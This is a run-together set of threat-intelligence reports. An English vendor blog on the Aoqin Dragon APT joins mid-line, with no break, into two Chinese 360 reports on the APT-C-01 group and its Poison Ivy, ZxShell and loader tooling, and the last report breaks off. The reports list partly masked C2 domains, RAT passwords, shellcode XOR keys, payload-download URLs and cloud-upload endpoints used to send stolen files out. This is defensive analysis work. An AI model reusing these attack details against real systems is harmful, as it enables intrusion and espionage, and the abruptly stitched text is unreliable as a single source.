Mongall uses base64 or RC4 to encode or encrypt data to make the content of command and control traffic more difficult to detectExecutive Summary
Active since 2013, the APT Aoqin Dragon flew under the radar for ten years before researchers at Sentinel Labs identified their activity. Aoqin Dragon’s primary focus is cyberespionage against targets in Vietnam, Cambodia, Hong Kong, Australia, and Singapore. Although the Chinese speaking threat actor is a small group, they are powerful and launched attacks against education, government, and telecommunications organizations while remaining invisible. Let’s take a look at Aoqin Dragon’s techniques, tactics, and how the group was able to go unnoticed for a decade.
aoqin dragon
Aoqin Dragon is a Chinese speaking threat actor who has been operating since 2013. The group is known for using explicit themes to infect users, as well as using USB shortcut techniques to spread their malware and infect other targets. Aoqin Dragon’s infection chain can be divided into three parts. They include:
The use of documents to exploit and trick victims into opening a malicious Word document to install a backdoor.
Luring victims into clicking on fake anti-virus icons or links to deploy malware in the victim’s device.
Forging a fake removable device to trick victims into opening a malicious folder and installing malware on their system.
According to our technology partner, SentinelOne's research team, Sentinel Labs, Aoqin Dragon’s baited documents (or lure documents) are geared towards targets interested in APAC political affairs. The documents also are not specific to one country but the entirety of Southeast Asia. Sentinel Labs also stated that because the group stayed in systems and networks long-term and were consistent with their attacks, they can assess that Aoqin Dragon’s motives are purely cyber espionage with their activities aligning with Chinese government political interests.
tactics and techniques
From 2012 to 2015, Aoqin Dragon took advantage of two vulnerabilities (CVE-2012-0158 and CVE-2010-3333) to compromise their targets. CVE-2012-0158 is a vulnerability in Windows Common Controls that allows for remote code execution. CVE-2010-3333 is a stack-based buffer overflow vulnerability in Microsoft Office that could allow attackers to execute arbitrary code via crafted RTF data.
Fake file icons and executable files have been used by varying threat actors over the years and is an effective tool for APTs like Aoqin Dragon. When combined with intriguing email content and a catchy file name, Aoqin Dragon can socially engineer their attacks and entice victims to click on a malicious file.
Since 2018, Aoqin Dagon has used fake removable USB device shortcuts as their initial point of infection. Victims who click on the shortcut icon will install a malicious loader, which contains two payloads. The first payload downloads the malicious files to removable devices for spreading and the second is an encrypted backdoor that creates a remote shell and uploads files to the victim’s machine. The second payload also downloads the files to Aoqin Dragon’s command and control servers. The encrypted backdoor also embedded three C2 servers for communication. Here is the attack chain of one of their most recent campaigns:
After the victim clicks on the fake device, “Evernote Tray Application” is executed. This is followed by the use of DLL hijacking to load the malicious encashrep.dll loader as explore.exe.
If the loader isn’t in the removable disk, it copies all modules under “%USERPROFILE%\AppData\Roaming\EverNoteService\”. This includes the backdoor loader, normal files, and the encrypted backdoor payload.
The value “EverNoteTrayUService” is used by the malware to set the auto start function. One the victim restarts their computer, “Evernote Tray Application” is executed, and DLL hijacking is used to load the malicious loader.
The loader checks the file path and then decrypts the payloads. As we mentioned previously, two payloads are used in the attack chain – 1. The spreader (copies malicious files to removable devices) and 2. The encrypted backdoor (injects itself into rundll32’s memory).
Aoqin Dragon also uses a custom backdoor that is more powerful than the previous one. The backdoor is a version of the Heyoka open-source project which uses spoofed DNS requests – creating bidirectional tunnel. Sentinel Labs stated that both backdoors have shell ability, but Heyoka is closer to a complete backdoor product.
Sentinel Labs stated that the main target type document formats Aoqin Dragon tries to find are Microsoft Word documents. Also, a script containing a “rar” command is embedded in the executable dropper with different fake security product icons. The dropper then employs a worm infection strategy using a removable device to infect malware into their victim’s device and breach their network.
Image 1: Infection Chain Flow
As you can see the DLL hijacking technique is used heavily by Aoqin Dragon to compromise targets and run their malware – including their newest malware loader, Mongall backdoor, and the modified version of Heyoka backdoor. According to Sentinel Labs, the Mongall backdoor is a small backdoor that goes back to 2013 when it was discovered by ESET. At that time, the threat actor using Mongall was targeting the Telecommunications Department and the Vietnamese government. Since then, Aoqin Dragon has been seen targeting Southeast Asia with an upgraded Mongall encryption protocol and Themida packer. Mongall isn’t rich in features but it’s still quite effective due to its ability to create a remote shell and upload files to a victim’s machine.
The modified Heyoka backdoor is a different from Mongall and is based on the Heyoka open-source project. The backdoor was modified to be a custom backdoor using the DLL injection to deploy in the victim’s environment. The debug log for Heyoka contains simplified Chinese characters, which indicates that the APT is Chinese speaking.
10 years the radar
Sentinel Labs has observed that Aoqin Dragon’s TTPs have evolved several times, which is how they were able to fly under the radar for a decade. The means they once used to infect their targeted devices has changed. During their first few years of operation, the threat actor relied on the previously mentioned CVE’s (CVE-2012-0158 and CVE-2010-3333). They were able to exploit these vulnerabilities due to their target’s negligence with patching.
In 2018, Aoqin Dragon changed the way they targeted devices by utilizing fake removable devices as their infection vector. They’ve also used other techniques to stay incognito, such as DNS tunneling. This technique involves the manipulation of an internet domain name system to bypass firewalls. Sentinel Labs reported that over time, Aoqin Dragon slowly executed their fake removable disc technique, which was done to keep their malware from being detected and removed by security products.
Researchers expect Aoqin Dragon to continue to conduct cyber espionage operations. They also expect the threat group to continue to advance their tradecraft and their methods for evading detection.
financially motivated threat groups vs. cyber espionage threat groups
Cyber Espionage Threat Groups
Unlike ransomware groups, cyberespionage threat actors are not typically seeking financial gain. Their purpose is to glean sensitive and classified data, trade secrets, and other forms of intellectual property that can be used politically. The attacks can be motivated by money, but this is not the case for cyber espionage groups most of the time.
Cyber Espionage groups generally target large corporations, government agencies, academic institution, and other organizations that have valuable intellectual property and technical data that can be used by another organization or government. Here is a list of assets cyber espionage threat actors attempt to access:
By obtaining access to the aforementioned list, threat actors can target organizations and wage a war between individuals, such as political leaders and government officials, as well as business executives. Most cyber espionage activity is placed under the advanced persistent threat (APT) umbrella. APTs are sophisticated and they generally establish an undetected presence on networks and systems so they can gather the information they need. Like Aoqin Dragon, cyber espionage APTs use social engineering to gather information from their target. Social engineering exploits human emotions (curiosity, fear, empathy, etc.) to trick victims into clicking on links or downloading malware.
Financially Motivated Threat Groups
Ransomware gangs and data extortion groups fall under the category for financially motivated attacks. They are motivated solely by money and their operations move much quicker than cyber espionage. These individuals operate like a business, going after a variety of industries such as healthcare, agriculture, government, education, and engineering. These threat groups usually do one of two things during their attacks: encrypt data and hold it ransom in exchange for a decryption key or exfiltrate data and threaten to leak it if a ransom is not paid.
Ransomware gangs like Conti and Hive are known for deploying ransomware into their victim’s networks and systems. While they may go undetected at first, they don’t stay that way for long and will expose themselves once they have encrypted their victims’ data or gathered the information they need. Once the ransom is paid, they will provide their victims with the decryption key or will keep their sensitive information from being exposed – although they don’t always keep their word.
How Avertium is Protecting Our CUSTOMERS
Threat actors like Aoqin Dragon can gain unlimited access to networks and systems by remaining incognito for years, furthering reconnaissance. Avertium is here to keep your organization safe and to mitigate any attacks caused by APTs like Aoqin Dragon:
To identify the source of your breach and the scope that it reached; you’ll want to include Avertium’s DFIR ( Digital Forensics and Incident Response ) services in your protection plan. We offer DFIR to mitigate damage from a successful breach. This service is provided as an on-demand crisis response service, as well as a retainer-based program.
Implement XDR as a prevention method. Our XDR is a combination of monitoring software like LogRhythm, Microsoft Azure Sentinel, or AlienVault, combined with endpoint protection such as SentinelOne. XDR platforms enable cybersecurity through a technology focus by collecting, correlating, and analyzing event data from any source on the network. This includes endpoints, applications, network devices, and user interactions.
MDR provides an in-depth investigation into potential threats to an organization’s network. Avertium’s risk-based approach to managed security delivers the right combination of technology, field-validated threat intelligence, and resource empowerment to reduce complexity, streamline operations, and enhance cybersecurity resilience. If you need a more advanced security solution, MDR is the next step. MDR is an outsourced security control solution that includes the elements of EDR, enhanced with a range of fundamental security processes.
Avertium offers VMaaS to provide a deeper understanding and control over organizational information security risks. If your enterprise is facing challenges with the scope, resources, or skills required to implement a vulnerability management program with your team, outsourced solutions can help you bridge the gap.
Avertium offers user awareness training through KnowBe4 . The service also Incident Response Table-Top exercises (IR TTX) and Core Security Document development, as well as a comprehensive new-school approach that integrates baseline testing using mock attacks.
Cybersecurity Education : Educate your employees on cyber security preparedness and the dangers of opening potentially malicious documents. Annual or quarterly training modules can help prevent threat actors from tricking employees into opening malicious email attachments.
Risk Analysis : Prevent an attack by ensuring your organization has a detailed defense strategy based on a risk analysis approach.
Tabletop Exercises : Have a good cyber incident response plan in place that has been tested with tabletop exercises.
Security Review : Be sure to review your cyber incident response plan and improve it every time it’s tested on real cyber threats.
SUPPORTING DOCUMENTATION
CVE - CVE-2010-3333 (mitre.org)
Aoqin Dragon APT targets entities in Southeast Asia and AustraliaSecurity Affairs
What is Cyber Espionage? – CrowdStrike
Chinese 'Aoqin Dragon' gang runs ten-year espionage spree • The Register
Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years - SentinelOne
Aoqin Dragon hacking group quietly spied on their targets for 10 years – Cyber Security Review (cybersecurity-review.com)
This hacking group quietly spied on their targets for 10 years | ZDNet
Chinese hacking group Aoqin Dragon quietly spied orgs for a decade (bleepingcomputer.com)
China-linked APT Flew Under Radar for Decade | Threatpost
Chinese-Linked APT Spying on Organizations for 10 Years (bankinfosecurity.com)背景 APT-C-01组织是一个长期针对国内国防、政府、科技和教育领域的重要机构实施网络间谍攻击活动的APT团伙，其最早的攻击活动可以追溯到2007年，360威胁情报中心对该团伙的活动一直保持着持续的跟踪。团伙擅长对目标实施鱼叉攻击和水坑攻击，植入修改后的ZXShell、Poison Ivy、XRAT商业木马，并使用动态域名作为其控制基础设施。 360威胁情报中心对日常的在野恶意代码跟踪流程中发现疑似针对性的APT攻击样本，通过对恶意代码的深入分析，利用威胁情报中心数据平台，确认其与内部长期跟踪的APT-C-01团伙存在关联，并且结合威胁情报数据挖掘到了该团伙更多的定向攻击活动。 木马分析 基于开源威胁情报，360威胁情报中心发现http:// * einfo.servegame.org域名地址托管了多个攻击恶意代码和恶意HTA文件，其用于攻击载荷的下载和分发。
Dropper分析 通过结合对此恶意代码分发域名上的恶意载荷分析，推测其应该使用CVE-2017-8759漏洞文档来投放第二阶段的攻击载荷，由于目前暂未关联到实际用于攻击活动的漏洞文档文件，结合该团伙过去的攻击特点，其应该是用于邮件鱼叉攻击。 并且进一步下载恶意的HTA文件，其执行PowerShell指令下载Loader程序，保存为officeupdate.exe并执行。
Loader分析 根据Loader程序中包含的字符串信息，制作者将其命名为SCLoaderByWeb，版本信息为1.0版，从字面意思为从Web获取的ShellcodeLoader程序。其用来下载执行shellcode代码。
Loader程序首先会尝试连接 www.baidu.com 判断网络联通性，如果没有联网，会每隔5秒尝试连接一次，直至能联网。 然后从http:// * einfo.servegame.org/tiny1detvghrt.tmp下载payload，如图：
接着判断文件是否下载成功，如果没有下载成功会休眠1秒后，然后再次尝试下载payload：
下载成功后，把下载的文件内容按每个字节分别和0xac，0x5c，0xdd异或解密(本质上就是直接每个字节异或0x2d)，如图： 之后把解密完的shellcode在新创建的线程中执行，如图：
Shellcode分析 分发域名地址托管的.tmp文件均为逐字节异或的shellcode，如下图为从分发域名下载的tinyq1detvghrt.tmp文件，该文件是和0x2d异或加密的数据。
解密后发现是Poison Ivy生成的shellcode，标志如下：
通过分析测试Poison Ivy木马生成的shellcode格式与该攻击载荷中使用的shellcode格式比较，得到每个配置字段在shellcode中的位置和含义。
其shellcode配置字段的格式详细如下：
在分析Poison Ivy中获取kernel32基址的代码逻辑时，发现其不兼容Windows 7版本系统，因为在Windows 7下InitializationOrderModule的第2个模块是KernelBase.dll，所以其获取的实际是KernelBase的基址。
由于Poison Ivy已经停止更新，所以攻击团伙为了使shellcode能够执行在后续版本的Windows系统，其采用了代码Patch对获取kernel32基址的代码做了改进。 其改进方法如下： 1. 在原有获取kernel32基址代码前增加跳转指令跳转到shellcode尾部，其patch代码增加在尾部； 2. patch代码首先获取InitializationOrderModule的第2个模块的基址(WinXP下为kernel32.dll,WIN7为kernelbase.dll)； 3. 然后获取InitializationOrderModule的第二个模块的LoadLibraryExA的地址(WinXP下的kernel32.dll和WIN7下的kernelbase.dll都有这个导出函数) 4. 最后通过调用LoadLibraryExA函数获取kernel32的基址。
攻击者针对shellcode的patch，使得其可以在不同的Windows系统版本通用。 该shellcode的功能主要是远控木马的控制模块，和C2通信并实现远程控制。这里我们在Win7系统下模拟该木马的上线过程。
对控制域名上托管的其他shellcode文件进行解密，获得样本的上线信息统计如下：
行动 ID 上线域名 端口 上线密码 互斥体
2017 *****e.*o.dyndns.org 5566 !@#3432!@#@! )!VoqA.I4
bing *****1789.dynssl.com 8088 zxc5566 )!VoqA.I4
ding1 *****ftword.serveuser.com 53 1wd3wa$RFGHY^%$ )!VoqA.I4
ding2 *****il163.sendsmtp.com 53 1wd3wa$RFGHY^%$ )!VoqA.I4
geiwoaaa *****aaa.qpoe.com 443 wyaaa8 )!VoqA.I4
jin_1 *****opin.mynumber.org 80 HK#mq6!Z+. )!VoqA.I4
jin_2 *****ngonly.rebatesrule.net 53 ~@FA<9p2c* )!VoqA.I4
justdied www.ser *****.*****died.com 80 ppt.168@ )!VoqA.I4
pouhui *****hui. *****tation.org 53 index#help )!VoqA.I4
tina_1 *****date.ocry.com 80 168168 )!VoqA.I4
tina_2 *****prp.ezua.com 53 116688 )!VoqA.I4
tony_1 *****update.dynamic-dns.net 80 0A@2q60#21 )!VoqA.I4
tony_2 *****patch.dnset.com 53 aZ!@2q6U0# )!VoqA.I4
通过进一步分析攻击载荷的回连C&C域名，发现大部分域名都是ChangeIP动态域名，从子域名的命名，攻击者更喜欢采用和Office，系统更新，163邮箱和招聘网相关的命名关键词。 1. 结合360威胁情报平台对C&C域名进行关联分析。这里我们对该团伙这次行动中(ding2.exe)使用的C&C域名 * il163.sendsmtp.com进行分析，其当前解析IP为 * . * .171.209。
2. 通过进一步查询IP历史映射域名，发现域名pps. * usic.com对应内部发现的APT-C-01组织历史使用的域名。
3. 通过搜索pps. * usic.com这个域名，得到关联样本。
该样本为该组织早期的攻击恶意代码。
4. 查询该域名历史解析IP。
5. 对域名历史映射的IP地址 . .114.161进行查询，发现 * e165.zyns.com域名，这个域名同样也是ChangeIP动态域名，并且曾经用于CVE-2017-0199的漏洞文档。
该漏洞文档是一个关于十九大的PPT，其最后修改时间为2017年12月12日。根据文档文件中的元数据，可以推测攻击者从网上检索到了“杨建华”制作的学习十八大党章的PPT文档，由名字为"steusr"的用户最后修改该文档内容制作为诱导文档。
控制基础设施资源 动态域名，主要为ChangeIP动态域名
主要攻击战术技术特征分析 1.使用鱼叉邮件投放漏洞文档，其用于下载执行恶意的HTA文件； 2.使用PowerShell下载执行第一阶段载荷； 3.修改Poison Ivy生成的shellcode作为命令控制模块； 4.使用动态域名进行命令控制，并且子域名通常伪装成Office，系统更新，163邮箱和招聘网相关内容；
攻击者通过使用动态域名和公开的木马来隐藏自身更多的标记信息，增加了追溯的难度，并且更加容易与普通的木马攻击事件相混淆。但从本次攻击活动的分析我们也可以发现对于攻击团伙和其拥有的资源丰富程度，其通常并非拥有无限的控制基础设施资源，所以当持续积累了足够的基础设施相关数据，并结合威胁情报的持续运营，往往可以将看似独立的事件关联到一起并确定指向。 目前，基于360威胁情报中心的威胁情报数据的全线产品，包括360威胁情报平台（TIP）、天眼高级威胁检测系统、360 NGSOC等，都已经支持对此APT攻击团伙攻击活动的检测。 参考链接 https://twitter.com/avman1995/status/933960565688483840 IOC
C&C 地址
***.***.66.10
***.***.32.168
***.***.220.223
***.***.67.36
***.***.133.169
***.***.8.137
***.***.125.176
***.***.228.61
***.***.9.206
***.***.171.209
*****gonly.rebatesrule.net
*****erk.gecekodu.com
*****r163.serveusers.com
*****date.ocry.com
*****aaa.qpoe.com
*****opin.mynumber.org
*****rvice.serveuser.com
*****ftword.serveuser.com
*****e.go.dyndns.org
*****info.servegame.org
*****il163.sendsmtp.com
*****update.dynamic-dns.net
*****prp.ezua.com
www.ser *****.*****died.com
*****1789.dynssl.com
*****patch.dnset.com
*****hui. *****tation.org
*****high.mefound.com
*****e165.zyns.com
http://*****e165.zyns.com/zxcvb.hta
LOADER MD5
**********5fffda3425d08c94c014a1
**********31ffcdbe65ab13d71b64ec
**********6fd8670137cade8b60a034
**********5bf285d095e0fd91cb6f03
**********e6528add4f9489ce1ec5d6
**********44d923f576e9f86adf9dc0
**********aaee991ff97845705e08b8
**********bd772a41a6698c6fd6e551第1章 概述
1. 主要发现
从2007年开始至今，360追日团队发现毒云藤组织对中国国防、政府、科技、教育以及海事机构等重点单位和部门进行了长达11年的网络间谍活动。该组织主要关注军工、中美关系、两岸关系和海洋相关领域，其关注的领域与我们之前发布的海莲花（OceanLotus）APT组织有一定相似的地方。
360追日团队捕获毒云藤的首个木马出现在2007年12月。在之后的11年中我们先后捕获到了13个版本的恶意代码，涉及样本数量73个。该组织在初始攻击环节主要采用鱼叉式钓鱼邮件攻击，攻击之前对目标进行了深入调研和精心挑选，选用与目标所属行业或领域密切相关的内容构造诱饵文件和邮件，主要是采用相应具体领域相关会议材料、研究成果或通知公告等主题。期间漏洞文档样本数量10个，其中包含1个0day漏洞。这些木马的感染者遍布国内31个省级行政区。C&C域名数量为59个，回传的地址位于4个不同国家或地区。
毒云藤在对中国持续11年的网络间谍活动中，下述相关时间点值得关注：
2007年12月，首次发现与该组织相关的木马。涉及海洋相关领域（疑似对某大型船务公司进行相关攻击）
2008年3月，对国内某高校重点实验室（某科研机构）
2009年2月，开始对军工行业展开攻击（某知名军工类期刊杂志社）
2009年10月，木马增加了特殊的对抗静态扫描的手法（API字符串逆序），相关手法沿用到大部分版本的木马中，并持续应用到2018年
2011年12月，木马增加了特殊的对抗动态检测的手法（错误API参数），相关手法沿用到大部分版本的木马中，并持续应用到2015年
2012年2月，首次发现基于zxshell代码的修改版后门1，其中关键功能是窃取如.doc.ppt.xls.wps类文档文件
2013年3月，对中科院，以及若干科技、海事等领域国家部委、局等进行了集中攻击
2013年10月，对中国某政府网站进行水坑攻击
2014年5月，发现zxshell修改版后门1的进化版本2，其中除了基于修改版1功能，增加了如“军”，“航”，“报告”关键字的搜索
2014年9月12日，首次发现与CVE-2014-4114（0day漏洞）相关事件和样本。
2014年10月14日，iSIGHT发布相关报告，并指出CVE-2014-4114（0day漏洞）。同日微软发布相关安全公告
2015年2月25日，对某军工领域协会组织（国防科技相关）、中国工程院等攻击，同时发现酷盘版样本
2017年10月，主要通过CVE-2017-8759漏洞文档对某大型媒体机构网站和泉州某机关相关人员实施鱼叉攻击
2018年4月，360威胁情报中心公开披露了该组织利用CVE-2017-8759漏洞文档的攻击恶意代码2
2018年5月，针对数家船舶重工企业、港口运营公司等海事行业机构发动攻击
以上首次攻击时间，是基于我们对该组织了解掌握的现有数据进行统计的，不代表我们已经掌握了该组织的全部攻击事件和行为。
2. 命名由来
自2015年，国内在APT方向的相关研究逐渐起步并加快。继“海莲花”、“蓝宝菇”等组织曝光之后，毒云藤组织（APT-C-01）是又一个针对政府、军工、海事等领域敏感信息持续发起攻击的APT组织。
该组织是360独立发现的，并率先披露了该组织的部分相关信息（参见： https://ti.360.net/blog/articles/analysis-of-apt-c-01/ ，发布时间：2018年4月），符合360对APT组织就行独立命名的条件。
360威胁情报中心将APT-C-01组织命名为“毒云藤”，主要是考虑了以下几方面的因素：一是该组织在多次攻击行动中，都使用了Poison Ivy（毒藤）木马；二、该攻击组织在中转信息时，曾使用云盘作为跳板传输资料，这跟爬藤类植物凌空而越过墙体，颇有相似之处。根据360威胁情报中心对APT组织的命名规则（参见《2016年中国高级持续性威胁研究报告》），同时结合该组织关联地区常见的蔓藤植物，将APT-C-01组织命名为“毒云藤”。
另，国内安天实验室于2018年9月19日发布APT攻击组织“绿斑”（Green Spot）分析报告。根据360威胁情报中心与安天实验室之间达成的能力型厂商成果互认约定，360威胁情报中心发现的“毒云藤”（APT-C-01）对应“绿斑”（Green Spot），二者是同一组织。因此，我们把监测到的情况与该组织攻击特点也公布出来，共同为中国提升APT防御能力而努力。
第2章 攻击目的和受害分析
1. 攻击目的
攻击组织的主要目的是窃取中国政府、科研相关行业领域的资料数据。相关数据主要以文档为主，关心的关键字主要包括以下关键字和扩展名的文件：
“201”，“2014”，“2015年”，“报”，“报告”，“兵”，“部队”，“对台”，“工作”，“规划”，“国”，“国际”，“航”，“合作”，“机”，“机场”，“基地”，“极地”，“军”，“军事”，“科技”，“密”，“内部”，“十”，“十三”，“台”，“台湾”，“铁路”，“无人”，“项”，“雪”，“研”，“运输”，“战”，“站”，“中”
“doc”，“ppt”，“xls”，“pdf”，“rtf”，“rar”，“wps”，“doc ”，“ppt ”，“xls*”
窃取用户主机相关信息
MAC Info：MAC信息，主要包括IP地址、网关信息等
Host Info：主机信息，主要包括操作系统信息、主机名称、本地用户名等
Process Info：当前进程信息
Version Info：相关版本信息，主要包括
Microsoft Office和Microsoft Internet Explorer版本信息
Disk Info：磁盘信息
图 1相关窃取用户主机信息截图（示例）
图 2被感染用户月统计（2014年7月-2015年6月）
2. 行业分布
主要涉及：国防、政府、科技、教育等
相关领域包括：海洋（南海、东海、测绘）、军工、涉台问题（两岸关系）、中美关系
3. 地域分布
图 3中国被感染地区分布图（2014年7月-2015年6月）
图 4中国被感染地区比例图
第3章 持续11年的活动
1. 初始攻击
1) 鱼叉式钓鱼邮件攻击
鱼叉式钓鱼邮件攻击是APT中常用的攻击手法，主要在APT的初始攻击环节。简单理解就是利用邮件作为攻击前导，其中正文、附件都可能携带恶意代码，进一步主要以附件携带漏洞文档文件为主，大约90%的攻击都是该类攻击 。
本小节主要介绍邮件携带漏洞文档和邮件携带二进制可执行文件这两种攻击方法。
A. 携带漏洞文档
图 13携带PE二进制可执行程序案例中木马释放迷惑文档打开后截图
攻击组织在发送钓鱼邮件通常登录web邮件和通过相关工具（PHPMailer ）进行攻击邮件的发送。
C. 携带自解压文件
攻击组织通过向目标邮箱发送压缩形态的RAR自解压格式程序。
附件里面是木马文件：
该文件实际是一个RAR自解压格式程序，参数如下，点击这个exe，会直接运行里面的bat文件：
默认的批处理命令会把木马主体移动到temp目录下，然后执行起来，同时删除该批处理文件：
2) RLO 伪装文档扩展名
图 14伪装文档扩展名（RLO）样本截图
3) 伪装图标隐藏扩展名
图 15伪装图标隐藏扩展名案例1截图
图 16伪装图标隐藏扩展名案例2截图
图 17伪装图标隐藏扩展名案例2木马释放的迷惑文档截图
2. 漏洞分析
1) CVE-2012-0158漏洞
参考链接 https://technet.microsoft.com/zh-cn/library/security/ms12-027.aspx
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158
A. 漏洞文档执行流程
图 18漏洞文档（CVE-2012-0158）执行流程
B. MHT格式
图 19漏洞文档两种形态（上MHT，下RTF）对比图
CVE-2012-0158漏洞主要以 rtf和doc格式为主，但本次攻击都是将doc文件保存为mht格式，导致杀软在漏洞检查时，因前置逻辑不匹配而漏检。相关漏洞文档文件在当时都是较低检出率。
C. shellcode对比
通过我们对漏洞文档的shellcode对比可以发现相关结构和功能都基本一致，进一步我们也能推断相关漏洞文档是同一组织开发。
2) CVE-2014-6352漏洞（0day）
A. 背景介绍
CVE-2014-4114漏洞是iSIGHT公司 在2014年10月14日发布相关报告，报告其中提到一个0day漏洞（CVE-2014-4114）用于俄罗斯相关主要针对北约、欧盟、电信和能源相关领域的网络间谍活动。微软也是在10月14日发布相关安全公告。
而CVE-2014-6352是可以认为绕过CVE-2014-4114补丁的漏洞，微软之前的修补方案首先在生成Inf和exe文件后添加MakeFileUnsafe调用，来设置文件Zone信息，这样随后在漏洞执行inf安装时，会有一个安全提示。而CVE-2014-6352漏洞样本抛弃了使用inf来安装exe，转而直接执行exe。因为xp以上系统可执行文件的右键菜单第二项是以管理员权限执行，这样导致如果用户关闭了uac会导致没有任何安全提醒。所以微软6352的补丁是在调用右键菜单添加一个安全提示弹窗。
https://technet.microsoft.com/zh-cn/library/security/ms14-060.aspx
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4114
https://technet.microsoft.com/zh-cn/library/security/3010060.aspx
https://technet.microsoft.com/zh-cn/library/security/ms14-064.aspx
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6352
B. 本次行动中相关介绍
图 20漏洞文档（CVE-2014-6352）属性相关信息
图 21 CVE-2014-6352相关关键时间节点
本次行动中的样本没有使用inf 来做跳板，而是直接使用exe，CVE-2014-4114漏洞触发后，默认调用的是右键菜单第二项，Windows7下正常是使用管理员权限打开，如果第二项是其他选项，则会将病毒路径作为参数传递，这也会产生部分兼容性问题。执行效果具体如下图所示：
图 22漏洞执行效果示意图
漏洞文档版本升级
图 23沙虫漏洞文档样本（版本A）相关截图
图 24沙虫漏洞文档样本（版本B）相关截图
图 25毒云藤漏洞文档样本（版本C）相关截图
3) CVE-2017-8759漏洞
A.背景介绍
CVE-2017-8759漏洞是FireEye公司在2017年9月12日披露的一个0Day漏洞（CVE-2017-8759）。微软也在9月12日发布了相关的安全公告。
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759
B.本次行动中相关介绍
Rtf文档中通过objautlink和objupdate控制字段自动更新链接，漏洞触发后导致mshta.exe执行远程指定的HTA文件。
HTA文件为一个嵌入了恶意VBS的html页面，该VBS调用POWERSHELL下载后续exe loader。
3. 持续渗透
1) RAT演进
RAT (Remote Access Trojan)：远程访问木马，俗称远控。
图 26相关RAT演进时间轴
相关后门程序总共涉及11个版本。相关比例数量如下：
图 27 11个版本RAT分布比例
2) RAT 13个版本分析
图 28 RAT相关版本分类
A. Poison Ivy
Poison Ivy木马本质上一款远程控制木马程序（RAT）。其中FireEye对Poison Ivy专门进行了一次研究分析 。
本次报告中出现的Poison Ivy木马对应的生成器版本均为2.3.2，Poison Ivy木马生成器从1.0.0版本开始总共10个版本，最新版本为2.3.2。Poison Ivy木马生成器可以生成EXE和shellcode两种版本，在本次行动中生成的木马均为shellcode形态。进一步相关互斥体绝大部分均为默认：“)!VoqA.I4”。
图 29 Posion Ivy生成器相关配置界面截图
图 30外层和内层PI关系
另外Poison Ivy木马均由外层母体依次异或key1和key2来得到shellcode。
图 31 Poison Ivy木马（三个）相关异或解密对比图
下表是相关Poison Ivy木马配置信息（ID和对应密码）列表。
B. ZxShell
ZxShell从2007年12月开始一直到2014年10月一直被毒云藤组织持续使用。由于相关版本差别较大，区分为内部公开版和源码公开版，第一个版指从2007年开始到2012年之前出现过的该组织使用的ZxShell木马，第二个版指从2012年开始到2014年出现过的该组织使用的相关ZxShell木马，相关木马是基于源码公开版进行开发，即我们称之为二次开发版。
内部公开版和源码公开版均为3.0版本，前者无大范围公开，其中功能较丰富，后者相关源码传播较为广泛，其中功能较之前版本剔除部分。
关于ZxShell的研究可以参看思科的Threat Spotlight: Group 72, Opening the ZxShell报告 。
从上表可以看出基于相关版本的木马，对应版本自带指令数量不断减少，也就是毒云藤组织剔除了较多已有的功能，在二次开发版中只保留了13个指令，进一步增量了其他指令和功能。二次开发版中相关新增功能如下表所示：
二次开发版与源码公开版对比
我们捕获到的样本是基于ZxShell源码修改，保留原有结构，ZxShell本身指令比较多，有二十多种。我们捕获的样本除了保留部分指令外，剔除了大量指令，如：安装启动，克隆系统账户，关闭防火墙，端口扫描，代理服务器等功能。另外增加“IEPass”指令。
图 32包含IEPass指令相关代码截图
相关子版本迭代更新（二次开发版）
对比上一个版本,变化主要是搜集信息的部分,搜集文档的创建时间时间从半年前变成4年前，增加对“.wps”扩展名的文件搜集，改变原来的“.doc”为“.doc*”；
窃取的文档的创建时间又重新变成半年，文件打包部分修改，去除文件版本信息；
比较大的改动，修改监控日志文件加密写到日志adovbs.mof，添加配置字符的监控，增加，增加了Profiles.log记录系统信息和文件信息；
代码功能较上个版本更新较少，相关函数位置发生了变化，是对抗杀毒软件进行了相关调整。
C. 酷盘版
相关样本伪装文件夹图标，执行后释放“svch0st.exe”的木马文件和用作迷惑用户的正常文件夹和“.doc”文档文件。
“svch0st.exe”是一个采用ssl加密协议传输的一个木马程序，它会每过一个小时，执行一遍所有的木马流程，木马流程把包括获取电脑上的所有信息（相关信息包括：文件目录、系统版本，网卡信息、进程列表信息、打包指定文件、网络信息和磁盘信息），还有如果发现文件有相关关键字（如：“台”、“军”、“战”）的文件，打包，通过ssl协议的方式上传到攻击者事先注册的酷盘。
C&C地址是酷盘地址 ，通过酷盘提供的API进行文件上传。
API上传接口：
https: // api-upload.kanbox.com /0/u pload /%s/ %s?bearer_token=%s
https: // auth.kanbox.com /0/ token
图 34包含酷盘API地址的代码截图
图 35酷盘官网首页截图
酷盘版相关配置信息列表
D. 未知RAT
未知RAT从外层dropper区分为文件夹和捆绑两个版本，其中的RAT分为4个版本，这4种RAT均为未知远控。
a) 文件夹版
图 36未知RAT文件版执行后相关变化
b) 捆绑版
67 d5f04fb0e00addc4085457f40900a2
└─Atnewyrr.exe~tmp .zip
│ newyrr .exe
└─doll .exe
aaa .vbs
b .bat
server .exe
stylus
图 37未知RAT中利用到的数字签名
E. 其他
毒云藤组织在相关行动中使用的后门程序，进一步还包括gh0st、XRAT、HttpBot这三种RAT。
3) 脚本加载的攻击载荷分析
2018年初，360威胁情报中心发现了毒云藤组织使用的一个用于控制和分发攻击载荷的控制域名 http://updateinfo.servegame.org， 并对外披露了相关攻击技术和关联分析(详见 https://ti.360.net/blog/articles/analysis-of-apt-c-01/)。
在该攻击活动中，该组织结合CVE-2017-8759漏洞文档，下载恶意的HTA文件，执行相关脚本命令来下载执行后续的攻击载荷模块。
A. Dropper分析
Dropper程序由鱼叉邮件附带的漏洞文档触发下载执行。
并且进一步下载恶意的HTA文件，其执行PowerShell指令下载Loader程序，保存为officeupdate.exe并执行。
B. Loader分析
根据Loader程序中包含的字符串信息，制作者将其命名为SCLoaderByWeb，版本信息为1.0版，从字面意思为从Web获取的Shellcode Loader程序。其用来下载执行shellcode代码。
Loader程序首先会尝试连接某常用网址，以判断网络联通性，如果没有联网，会每隔5秒尝试连接一次，直至能联网。
然后从hxxp://updateinfo.servegame.org/tiny1detvghrt.tmp下载payload，如图：
接着判断文件是否下载成功，如果没有下载成功会休眠1秒后，然后再次尝试下载payload：
